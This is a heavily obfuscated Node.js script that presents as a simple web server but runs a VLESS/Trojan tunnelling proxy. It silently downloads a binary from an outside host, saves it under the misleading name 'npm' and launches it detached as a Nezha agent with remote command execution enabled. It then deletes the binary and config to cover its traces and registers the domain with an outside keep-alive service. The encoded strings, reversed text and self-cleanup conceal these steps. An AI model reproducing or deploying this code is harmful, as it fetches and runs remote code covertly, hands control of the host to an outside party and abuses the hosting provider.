var _0xcbb68d=(273157^273165)+(675105^675111);const os=require("\u006F\u0073");_0xcbb68d=(959488^959495)+(572879^572878);const http=require("\u0068\u0074\u0074\u0070");var _0x176ac=(753646^753647)+(262050^262055);const fs=require("\u0066\u0073");_0x176ac=170706^170704;var _0x614e=(530175^530172)+(538909^538906);const axios=require("\u0061\u0078\u0069\u006F\u0073");_0x614e=(272576^272580)+(304497^304501);var _0xb92f=(633029^633025)+(972796^972789);const net=require("\u006E\u0065\u0074");_0xb92f=(729972^729970)+(696058^696062);const path=require("\u0070\u0061\u0074\u0068");const crypto=require("\u0063\u0072\u0079\u0070\u0074\u006F");const{'\u0042\u0075\u0066\u0066\u0065\u0072':Buffer}=require("\u0062\u0075\u0066\u0066\u0065\u0072");const{"exec":exec,"execSync":execSync}=require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073");const{"WebSocket":WebSocket,'\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0065\u0062\u0053\u006F\u0063\u006B\u0065\u0074\u0053\u0074\u0072\u0065\u0061\u006D':createWebSocketStream}=require("\u0077\u0073");const UUID=process['\u0065\u006E\u0076']['\u0055\u0055\u0049\u0044']||"\u0035\u0033\u0065\u0037\u0065\u0064\u0031\u0066\u002D\u0032\u0034\u0033\u0033\u002D\u0034\u0061\u0062\u0063\u002D\u0038\u0033\u0033\u0035\u002D\u0065\u0036\u0062\u0036\u0066\u0035\u0066\u0037\u0063\u0037\u0036\u0039";var _0xe34fbc;const NEZHA_SERVER=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0053\u0045\u0052\u0056\u0045\u0052']||'';_0xe34fbc=524851^524854;const NEZHA_PORT=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0050\u004F\u0052\u0054']||'';const NEZHA_KEY=process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u004B\u0045\u0059']||'';const DOMAIN=process['\u0065\u006E\u0076']['\u0044\u004F\u004D\u0041\u0049\u004E']||"\u0031\u0032\u0033\u0034\u002E\u0061\u0062\u0063\u002E\u0063\u006F\u006D";var _0x2af13e=(291512^291517)+(945709^945706);const AUTO_ACCESS=process['\u0065\u006E\u0076']['\u0041\u0055\u0054\u004F\u005F\u0041\u0043\u0043\u0045\u0053\u0053']||!![];_0x2af13e=408360^408363;var _0x_0x1a4;const WSPATH=process['\u0065\u006E\u0076']['\u0057\u0053\u0050\u0041\u0054\u0048']||UUID['\u0073\u006C\u0069\u0063\u0065'](264988^264988,773746^773754);_0x_0x1a4='\u0066\u0068\u006F\u006C\u0069\u0064';var _0xff23a;const SUB_PATH=process['\u0065\u006E\u0076']['\u0053\u0055\u0042\u005F\u0050\u0041\u0054\u0048']||"\u0073\u0075\u0062";_0xff23a=(589277^589273)+(504623^504617);const NAME=process['\u0065\u006E\u0076']['\u004E\u0041\u004D\u0045']||'';const PORT=process['\u0065\u006E\u0076']['\u0050\u004F\u0052\u0054']||207729^210373;let ISP='';const GetISP=async()=>{try{var _0xd8c58b;const res=await axios['\u0067\u0065\u0074']("pioeg/bs.pi.ipa//:sptth".split("").reverse().join(""));_0xd8c58b=(160722^160725)+(629388^629386);var _0xceca4d=(537379^537387)+(789437^789436);const data=res['\u0064\u0061\u0074\u0061'];_0xceca4d='\u006F\u0070\u0065\u0067\u0065\u0066';ISP=`${data['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']}-${data['\u0069\u0073\u0070']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u0020','\u0067'),"\u005F");}catch(e){ISP="\u0055\u006E\u006B\u006E\u006F\u0077\u006E";}};GetISP();const httpServer=http['\u0063\u0072\u0065\u0061\u0074\u0065\u0053\u0065\u0072\u0076\u0065\u0072']((req,res)=>{if(req['\u0075\u0072\u006C']==="\u002F"){var _0xbcd85b=(853800^853807)+(244738^244746);const filePath=path['\u006A\u006F\u0069\u006E'](__dirname,"\u0069\u006E\u0064\u0065\u0078\u002E\u0068\u0074\u006D\u006C");_0xbcd85b=717558^717556;fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065'](filePath,"\u0075\u0074\u0066\u0038",(err,content)=>{if(err){res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](530440^530624,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0074\u0065\u0078\u0074\u002F\u0068\u0074\u006D\u006C"});res['\u0065\u006E\u0064']("\u0048\u0065\u006C\u006C\u006F\u0020\u0077\u006F\u0072\u006C\u0064\u0021");return;}res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](990109^990037,{'Content-Type':'text/html'});res['\u0065\u006E\u0064'](content);});return;}else if(req['\u0075\u0072\u006C']===`/${SUB_PATH}`){var _0xge88f=(737920^737924)+(183160^183162);const namePart=NAME?`${NAME}-${ISP}`:ISP;_0xge88f=(815355^815356)+(451117^451119);const vlessURL=`vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;var _0x98f46a=(578335^578330)+(983572^983570);const trojanURL=`trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;_0x98f46a='\u0065\u006E\u0063\u006D\u0066\u006B';const subscription=vlessURL+"\u000A"+trojanURL;const base64Content=Buffer['\u0066\u0072\u006F\u006D'](subscription)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034");res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](140692^140636,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E"});res['\u0065\u006E\u0064'](base64Content+"\u000A");}else{res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](559813^559953,{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E"});res['\u0065\u006E\u0064']("\u004E\u006F\u0074\u0020\u0046\u006F\u0075\u006E\u0064\u000A");}});const wss=new WebSocket['\u0053\u0065\u0072\u0076\u0065\u0072']({'\u0073\u0065\u0072\u0076\u0065\u0072':httpServer});var _0xf2fbbb=(898817^898820)+(729404^729396);const uuid=UUID['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u002D','\u0067'),"");_0xf2fbbb="gflfig".split("").reverse().join("");const DNS_SERVERS=["4.4.8.8".split("").reverse().join(""),"\u0031\u002E\u0031\u002E\u0031\u002E\u0031"];function resolveHost(host){return new Promise((resolve,reject)=>{if(new RegExp('\u005E\u0028\u003F\u003A\u0028\u003F\u003A\u0032\u0035\u005B\u0030\u002D\u0035\u005D\u007C\u0032\u005B\u0030\u002D\u0034\u005D\u005B\u0030\u002D\u0039\u005D\u007C\u005B\u0030\u0031\u005D\u003F\u005B\u0030\u002D\u0039\u005D\u005B\u0030\u002D\u0039\u005D\u003F\u0029\u005C\u002E\u0029\u007B\u0033\u007D\u0028\u003F\u003A\u0032\u0035\u005B\u0030\u002D\u0035\u005D\u007C\u0032\u005B\u0030\u002D\u0034\u005D\u005B\u0030\u002D\u0039\u005D\u007C\u005B\u0030\u0031\u005D\u003F\u005B\u0030\u002D\u0039\u005D\u005B\u0030\u002D\u0039\u005D\u003F\u0029\u0024',"")['\u0074\u0065\u0073\u0074'](host)){resolve(host);return;}var _0x2_0x62b=(812497^812505)+(924847^924840);let _0xa_0xe71=342963^342963;_0x2_0x62b="gfcmmb".split("").reverse().join("");function _0xad_0x4f3(){if(_0xa_0xe71>=DNS_SERVERS['\u006C\u0065\u006E\u0067\u0074\u0068']){reject(new Error(`Failed to resolve ${host} with all DNS servers`));return;}const _0x6206e=DNS_SERVERS[_0xa_0xe71];_0xa_0xe71++;var _0xc_0xe1c=(617420^617419)+(666508^666511);const _0x9gd06a=`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;_0xc_0xe1c=893771^893771;axios['\u0067\u0065\u0074'](_0x9gd06a,{"timeout":5000,'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0041\u0063\u0063\u0065\u0070\u0074":'application/dns-json'}})['\u0074\u0068\u0065\u006E'](response=>{const _0x74a20a=response['\u0064\u0061\u0074\u0061'];if(_0x74a20a['\u0053\u0074\u0061\u0074\u0075\u0073']===(968529^968529)&&_0x74a20a['\u0041\u006E\u0073\u0077\u0065\u0072']&&_0x74a20a['\u0041\u006E\u0073\u0077\u0065\u0072']['\u006C\u0065\u006E\u0067\u0074\u0068']>(823604^823604)){const _0xcd6a3g=_0x74a20a['\u0041\u006E\u0073\u0077\u0065\u0072']['\u0066\u0069\u006E\u0064'](record=>record['\u0074\u0079\u0070\u0065']===(572186^572187));if(_0xcd6a3g){resolve(_0xcd6a3g['\u0064\u0061\u0074\u0061']);return;}}_0xad_0x4f3();})['\u0063\u0061\u0074\u0063\u0068'](error=>{_0xad_0x4f3();});}_0xad_0x4f3();});}function handleVlessConnection(ws,msg){const[VERSION]=msg;const _0x2d54c=msg['\u0073\u006C\u0069\u0063\u0065'](540507^540506,368541^368524);if(!_0x2d54c['\u0065\u0076\u0065\u0072\u0079']((v,i)=>v==parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i*(448476^448478),649589^649591),469376^469392)))return false;var _0xed636c;let i=msg['\u0073\u006C\u0069\u0063\u0065'](974258^974243,981067^981081)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']()+(688843^688856);_0xed636c=810994^810996;var _0xbc5e7d=(631040^631047)+(168328^168333);const _0x4fad2a=msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=798208^798210)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](226351^226351);_0xbc5e7d='\u0062\u0062\u0069\u0066\u006B\u006F';var _0x783da=(268643^268643)+(798603^798595);const _0x9db=msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=509589^509588)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']();_0x783da=750982^750977;var _0x887f1a;const _0x225bec=_0x9db==(369008^369009)?msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=719336^719340)['\u006A\u006F\u0069\u006E']("\u002E"):_0x9db==(651842^651840)?new TextDecoder()['\u0064\u0065\u0063\u006F\u0064\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i+(468251^468250),i+=(977140^977141)+msg['\u0073\u006C\u0069\u0063\u0065'](i,i+(960620^960621))['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']())):_0x9db==(733632^733635)?msg['\u0073\u006C\u0069\u0063\u0065'](i,i+=969496^969480)['\u0072\u0065\u0064\u0075\u0063\u0065']((s,b,i,a)=>i%(253939^253937)?s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i-(535900^535901),i+(425296^425297))):s,[])['\u006D\u0061\u0070'](b=>b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](394565^394565)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](871798^871782))['\u006A\u006F\u0069\u006E']("\u003A"):'';_0x887f1a=(107919^107910)+(710886^710884);ws['\u0073\u0065\u006E\u0064'](new Uint8Array([VERSION,825316^825316]));var _0xde9d8c=(684252^684251)+(152380^152376);const _0x6cd6c=createWebSocketStream(ws);_0xde9d8c="jeigpc".split("").reverse().join("");resolveHost(_0x225bec)['\u0074\u0068\u0065\u006E'](resolvedIP=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({"host":resolvedIP,'\u0070\u006F\u0072\u0074':_0x4fad2a},function(){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));_0x6cd6c['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](_0x6cd6c);})['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{});})['\u0063\u0061\u0074\u0063\u0068'](error=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({"host":_0x225bec,"port":_0x4fad2a},function(){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));_0x6cd6c['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x6cd6c);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});return!![];}function handleTrojanConnection(ws,msg){try{if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']<(589002^589040))return false;const _0x2544b=msg['\u0073\u006C\u0069\u0063\u0065'](820556^820556,649585^649545)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();const _0x92eed=[UUID];var _0x594d8g=(780483^780484)+(178727^178723);let _0x32adbd=null;_0x594d8g=(364858^364863)+(546395^546397);for(const _0x72g8e of _0x92eed){const _0x4_0x72a=crypto['\u0063\u0072\u0065\u0061\u0074\u0065\u0048\u0061\u0073\u0068']("422ahs".split("").reverse().join(""))['\u0075\u0070\u0064\u0061\u0074\u0065'](_0x72g8e)['\u0064\u0069\u0067\u0065\u0073\u0074']("\u0068\u0065\u0078");if(_0x4_0x72a===_0x2544b){_0x32adbd=_0x72g8e;break;}}if(!_0x32adbd)return false;let _0xe64beb=864379^864323;if(msg[_0xe64beb]===(875866^875863)&&msg[_0xe64beb+(653165^653164)]===(544194^544200)){_0xe64beb+=877756^877758;}var _0x45d;const _0xcd6b7c=msg[_0xe64beb];_0x45d="kegdne".split("").reverse().join("");if(_0xcd6b7c!==(983451^983450))return false;_0xe64beb+=644211^644210;var _0xbcb=(613128^613131)+(532490^532488);const _0x401f9f=msg[_0xe64beb];_0xbcb=852710^852704;_0xe64beb+=852572^852573;let _0x8df5f,_0x2f33c;if(_0x401f9f===(588935^588934)){_0x8df5f=msg['\u0073\u006C\u0069\u0063\u0065'](_0xe64beb,_0xe64beb+(389905^389909))['\u006A\u006F\u0069\u006E']("\u002E");_0xe64beb+=778117^778113;}else if(_0x401f9f===(440550^440549)){const _0xb4f6b=msg[_0xe64beb];_0xe64beb+=763952^763953;_0x8df5f=msg['\u0073\u006C\u0069\u0063\u0065'](_0xe64beb,_0xe64beb+_0xb4f6b)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();_0xe64beb+=_0xb4f6b;}else if(_0x401f9f===(194094^194090)){_0x8df5f=msg['\u0073\u006C\u0069\u0063\u0065'](_0xe64beb,_0xe64beb+(314825^314841))['\u0072\u0065\u0064\u0075\u0063\u0065']((s,b,i,a)=>i%(584287^584285)?s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i-(288297^288296),i+(559191^559190))):s,[])['\u006D\u0061\u0070'](b=>b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](768694^768694)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](460880^460864))['\u006A\u006F\u0069\u006E']("\u003A");_0xe64beb+=972689^972673;}else{return false;}_0x2f33c=msg['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](_0xe64beb);_0xe64beb+=584210^584208;if(_0xe64beb<msg['\u006C\u0065\u006E\u0067\u0074\u0068']&&msg[_0xe64beb]===(117829^117832)&&msg[_0xe64beb+(174014^174015)]===(878546^878552)){_0xe64beb+=194673^194675;}const _0x4617c=createWebSocketStream(ws);resolveHost(_0x8df5f)['\u0074\u0068\u0065\u006E'](resolvedIP=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':resolvedIP,"port":_0x2f33c},function(){if(_0xe64beb<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xe64beb));}_0x4617c['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x4617c);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});})['\u0063\u0061\u0074\u0063\u0068'](error=>{net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({'\u0068\u006F\u0073\u0074':_0x8df5f,"port":_0x2f33c},function(){if(_0xe64beb<msg['\u006C\u0065\u006E\u0067\u0074\u0068']){this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0xe64beb));}_0x4617c['\u006F\u006E']("rorre".split("").reverse().join(""),()=>{})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{})['\u0070\u0069\u0070\u0065'](_0x4617c);})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});return!![];}catch(error){return false;}}wss['\u006F\u006E']("\u0063\u006F\u006E\u006E\u0065\u0063\u0074\u0069\u006F\u006E",(ws,req)=>{const url=req['\u0075\u0072\u006C']||'';ws['\u006F\u006E\u0063\u0065']("egassem".split("").reverse().join(""),msg=>{if(msg['\u006C\u0065\u006E\u0067\u0074\u0068']>(915458^915475)&&msg[430184^430184]===(871546^871546)){var _0xd701f;const id=msg['\u0073\u006C\u0069\u0063\u0065'](534063^534062,107405^107420);_0xd701f='\u0065\u006C\u006D\u006B\u0062\u006A';const isVless=id['\u0065\u0076\u0065\u0072\u0079']((v,i)=>v==parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i*(138621^138623),431930^431928),472449^472465));if(isVless){if(!handleVlessConnection(ws,msg)){ws['\u0063\u006C\u006F\u0073\u0065']();}return;}}if(!handleTrojanConnection(ws,msg)){ws['\u0063\u006C\u006F\u0073\u0065']();}})['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",()=>{});});const getDownloadUrl=()=>{const arch=os['\u0061\u0072\u0063\u0068']();if(arch==="mra".split("").reverse().join("")||arch==="\u0061\u0072\u006D\u0036\u0034"||arch==="46hcraa".split("").reverse().join("")){if(!NEZHA_PORT){return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";}else{return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074";}}else{if(!NEZHA_PORT){return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";}else{return"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074";}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const url=getDownloadUrl();const response=await axios({"method":"\u0067\u0065\u0074","url":url,"responseType":"\u0073\u0074\u0072\u0065\u0061\u006D"});const writer=fs['\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0072\u0069\u0074\u0065\u0053\u0074\u0072\u0065\u0061\u006D']("mpn".split("").reverse().join(""));response['\u0064\u0061\u0074\u0061']['\u0070\u0069\u0070\u0065'](writer);return new Promise((resolve,reject)=>{writer['\u006F\u006E']("hsinif".split("").reverse().join(""),()=>{console['\u006C\u006F\u0067']("yllufsseccus daolnwod mpn".split("").reverse().join(""));exec("\u0063\u0068\u006D\u006F\u0064\u0020\u002B\u0078\u0020\u006E\u0070\u006D",err=>{if(err)reject(err);resolve();});});writer['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072",reject);});}catch(err){throw err;}};var _0xaf_0x8e2=(248212^248208)+(437417^437422);const runnz=async()=>{try{var _0x8bf=(912904^912906)+(107794^107798);const status=execSync("\"mp]n[/.\" perg | \"perg\" v- perg | xua sp".split("").reverse().join(""),{'\u0065\u006E\u0063\u006F\u0064\u0069\u006E\u0067':"\u0075\u0074\u0066\u002D\u0038"});_0x8bf='\u0065\u006D\u0064\u0068\u0065\u006A';if(status['\u0074\u0072\u0069\u006D']()!==''){console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0069\u0073\u0020\u0061\u006C\u0072\u0065\u0061\u0064\u0079\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002C\u0020\u0073\u006B\u0069\u0070\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002E\u002E\u002E");return;}}catch(e){}await downloadFile();var _0xca_0xf48;let command='';_0xca_0xf48=775372^775369;var _0xe85a=(159610^159612)+(126666^126664);let tlsPorts=["344".split("").reverse().join(""),"3448".split("").reverse().join(""),"\u0032\u0030\u0039\u0036","7802".split("").reverse().join(""),"3802".split("").reverse().join(""),"\u0032\u0030\u0035\u0033"];_0xe85a=(407106^407114)+(177433^177438);if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const NEZHA_TLS=tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](NEZHA_PORT)?"slt--".split("").reverse().join(""):'';command=`setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const port=NEZHA_SERVER['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u003A")?NEZHA_SERVER['\u0073\u0070\u006C\u0069\u0074']("\u003A")['\u0070\u006F\u0070']():'';var _0x3_0xe5c=(190684^190681)+(147395^147403);const NZ_TLS=tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](port)?"eurt".split("").reverse().join(""):"\u0066\u0061\u006C\u0073\u0065";_0x3_0xe5c=246538^246539;const configYaml=`client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063']("\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C",configYaml);}command=`setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;}else{console['\u006C\u006F\u0067']("\u004E\u0045\u005A\u0048\u0041\u0020\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u0020\u0069\u0073\u0020\u0065\u006D\u0070\u0074\u0079\u002C\u0020\u0073\u006B\u0069\u0070\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");return;}try{exec(command,{'\u0073\u0068\u0065\u006C\u006C':"\u002F\u0062\u0069\u006E\u002F\u0062\u0061\u0073\u0068"},err=>{if(err)console['\u0065\u0072\u0072\u006F\u0072']("\u006E\u0070\u006D\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u0020\u0065\u0072\u0072\u006F\u0072\u003A",err);else console['\u006C\u006F\u0067']("gninnur si mpn".split("").reverse().join(""));});}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`error: ${error}`);}};_0xaf_0x8e2=(866789^866789)+(176824^176829);async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0xbc_0xe77=`https://${DOMAIN}`;try{const _0xdfa6f=await axios['\u0070\u006F\u0073\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006F\u006F\u006F\u006F\u002E\u0073\u0065\u0072\u0076\u0030\u0030\u002E\u006E\u0065\u0074\u002F\u0061\u0064\u0064\u002D\u0075\u0072\u006C",{'\u0075\u0072\u006C':_0xbc_0xe77},{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'Content-Type':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});console['\u006C\u006F\u0067']("yllufsseccus dedda ksaT sseccA citamotuA".split("").reverse().join(""));}catch(error){}}var _0xe45b6a=(931134^931129)+(771097^771097);const delFiles=()=>{fs['\u0075\u006E\u006C\u0069\u006E\u006B']("mpn".split("").reverse().join(""),()=>{});fs['\u0075\u006E\u006C\u0069\u006E\u006B']("\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C",()=>{});};_0xe45b6a="lcngha".split("").reverse().join("");httpServer['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},180000);addAccessTask();console['\u006C\u006F\u0067'](`Server is running on port ${PORT}`);});
